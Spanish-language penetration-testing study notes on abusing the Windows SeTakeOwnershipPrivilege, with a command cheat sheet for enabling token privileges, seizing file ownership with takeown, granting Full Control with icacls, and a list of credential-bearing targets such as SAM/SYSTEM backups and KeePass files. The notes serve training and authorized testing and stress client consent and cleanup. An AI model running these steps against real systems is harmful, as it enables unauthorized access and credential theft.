---
tags:
  - windows
  - privex
  - SeTakeOwnershipPrivilege
---
## Conceptos Clave (TL;DR)

- Otorga derechos **WRITE_OWNER**: permite tomar posesión (ownership) de cualquier "securable object" (objetos AD, archivos/carpetas NTFS, impresoras, claves de registro, servicios, procesos).
- Los Administradores la tienen por defecto. En cuentas estándar es raro, pero es común en **cuentas de servicio** (ej. backups/VSS), a menudo combinada con `SeBackupPrivilege`, `SeRestorePrivilege` y `SeSecurityPrivilege`.
- Puede obtenerse abusando de una **GPO mal configurada** (ej. con SharpGPOAbuse) para asignarla a un usuario que controlamos.
- **Importante:** tomar ownership de un archivo NO garantiza poder leerlo. Suele ser necesario modificar la ACL después (con `icacls`) para obtener permisos efectivos de lectura/escritura.

## Herramientas Clave

- **whoami /priv** — Enumera los privilegios del token del usuario actual y su estado (Enabled/Disabled).
- **Enable-Privilege.ps1 / EnableAllTokenPrivs.ps1** — Scripts para habilitar privilegios de token que aparecen como "Disabled".
- **Get-ChildItem / Get-Acl** — Inspeccionar metadatos de archivo y consultar el owner actual.
- **cmd /c dir /q** — Mostrar el owner de archivos/carpetas desde CMD (alternativa cuando Get-Acl no muestra el owner por falta de permisos).
- **takeown** — Binario nativo de Windows para tomar ownership de un archivo/carpeta.
- **icacls** — Modificar la ACL de un archivo/carpeta para conceder permisos explícitos (ej. Full Control) tras tomar ownership.
- **SharpGPOAbuse** (mencionado como vector) — Herramienta para abusar de GPOs y asignarse privilegios como este.

## Metodología Paso a Paso

1. **Enumerar privilegios actuales**
   Verificar si el usuario actual tiene `SeTakeOwnershipPrivilege` y si está habilitado o deshabilitado en el token.

2. **Habilitar el privilegio (si aparece Disabled)**
   Por defecto el privilegio puede estar presente en el token pero deshabilitado. Hay que activarlo explícitamente antes de poder usarlo.

3. **Identificar el archivo/objetivo de interés**
   Enumerar file shares (carpetas Public/Private, subdirectorios por departamento). Buscar archivos con nombres sugerentes (cred*, pass*, config, etc.) en directorios donde se tiene acceso de listado pero no de lectura.

4. **Comprobar el owner actual del objeto**
   Si `Get-Acl` no muestra el owner (por falta de permisos), revisar el owner del directorio padre con `dir /q` como alternativa.

5. **Tomar ownership del archivo**
   Usar `takeown` para convertirse en el nuevo propietario del archivo. Esto NO concede automáticamente permisos de lectura.

6. **Confirmar el cambio de ownership**
   Volver a consultar el owner del archivo para verificar que ahora es nuestro usuario.

7. **Modificar la ACL para obtener acceso real**
   Si al intentar leer el archivo se recibe "Access Denied", usar `icacls` para concedernos permisos (ej. Full Control) sobre el archivo.

8. **Leer/extraer el contenido**
   Leer el archivo localmente, abrirlo vía RDP, o copiarlo al equipo atacante para procesamiento adicional (ej. crackear una base KeePass).

9. **Cleanup y reporte**
   Intentar revertir ownership/permisos originales. Si no es posible, documentarlo claramente en el reporte/apéndice y notificar al cliente. Evaluar si conviene solo documentar la vulnerabilidad sin explotarla completamente por el riesgo de impacto.

## Cheat Sheet de Comandos

```powershell
# Enumerar privilegios del usuario actual y su estado (Enabled/Disabled)
whoami /priv
```

```powershell
# Importar el script para gestionar privilegios de token
Import-Module .\Enable-Privilege.ps1

# Habilitar todos los privilegios de token disponibles (incluye SeTakeOwnershipPrivilege)
.\EnableAllTokenPrivs.ps1
```

```powershell
# Confirmar que el privilegio quedó en estado "Enabled"
whoami /priv
```

```powershell
# Consultar metadatos y owner del archivo objetivo (puede no mostrar owner si no hay permisos suficientes)
Get-ChildItem -Path '<TARGET_FILE_PATH>' | Select Fullname,LastWriteTime,Attributes,@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }}
```

```cmd
:: Alternativa para ver el owner de un directorio/archivo cuando Get-Acl no lo muestra
:: /q muestra el owner de cada archivo/carpeta
cmd /c dir /q '<TARGET_DIRECTORY_PATH>'
```

```powershell
# Tomar ownership del archivo objetivo
# /f especifica el archivo o carpeta sobre el que se toma ownership
takeown /f '<TARGET_FILE_PATH>'
```

```powershell
# Confirmar que el ownership cambió correctamente al usuario actual
Get-ChildItem -Path '<TARGET_FILE_PATH>' | select name,directory, @{Name="Owner";Expression={(Get-ACL $_.Fullname).Owner}}
```

```powershell
# Intento de lectura (puede fallar con Access Denied aunque ya seamos el owner)
cat '<TARGET_FILE_PATH>'
```

```powershell
# Conceder permisos completos (Full Control) sobre el archivo a nuestro usuario
# /grant <USER>:F asigna control total (F = Full) al usuario indicado
icacls '<TARGET_FILE_PATH>' /grant <USER>:F
```

```powershell
# Leer el contenido del archivo tras ajustar la ACL
cat '<TARGET_FILE_PATH>'
```

## Gotchas y Troubleshooting

- `whoami /priv` puede mostrar `SeTakeOwnershipPrivilege` como **Disabled** aunque esté asignado: hay que habilitarlo en el token antes de poder explotarlo (no basta con que figure en la lista).
- Tomar ownership con `takeown` **no garantiza acceso de lectura**: es muy común seguir recibiendo "Access Denied" hasta ajustar la ACL con `icacls`.
- Si `Get-Acl`/`Get-ChildItem` no muestra el campo Owner, es señal de permisos insuficientes sobre el objeto; revisar el owner del directorio padre con `dir /q` como workaround.
- Esta es una **acción potencialmente destructiva**: cambiar el ownership de un archivo (ej. un `web.config` en producción) puede romper una aplicación o causar DoS. Requiere consentimiento explícito del cliente antes de ejecutarse en entornos reales.
- Evitar cambiar ownership de archivos ubicados varios subdirectorios por debajo (y cambiar permisos en cada nivel del camino), ya que revertir el cambio correctamente puede ser muy difícil.
- Buena práctica: tras explotar, **revertir ownership y ACL** a su estado original. Si no es posible, documentarlo en un apéndice del reporte y avisar al cliente.
- Algunos clientes prefieren que solo se **documente la posibilidad** de explotación (PoC) sin llegar a modificar el archivo real, dado el riesgo/impacto.
- Vector de origen del privilegio: puede ser nativo de una cuenta de servicio (backups/VSS) o conseguido vía abuso de GPO (ej. con SharpGPOAbuse) en un entorno AD.
- Ruta de configuración en Group Policy: `Computer Configuration -> Windows Settings -> Security Settings -> Local Policies -> User Rights Assignment -> "Take ownership of files or other objects"`.
- Archivos/objetivos de interés típicos a buscar una vez con el privilegio activo:
  - `c:\inetpub\wwwroot\web.config`
  - `%WINDIR%\repair\sam`
  - `%WINDIR%\repair\system`
  - `%WINDIR%\repair\software`, `%WINDIR%\repair\security`
  - `%WINDIR%\system32\config\SecEvent.Evt`
  - `%WINDIR%\system32\config\default.sav`
  - `%WINDIR%\system32\config\security.sav`
  - `%WINDIR%\system32\config\software.sav`
  - `%WINDIR%\system32\config\system.sav`
  - Archivos `.kdbx` (KeePass), notebooks de OneNote, `passwords.*`, `pass.*`, `creds.*`, scripts y otros archivos de configuración.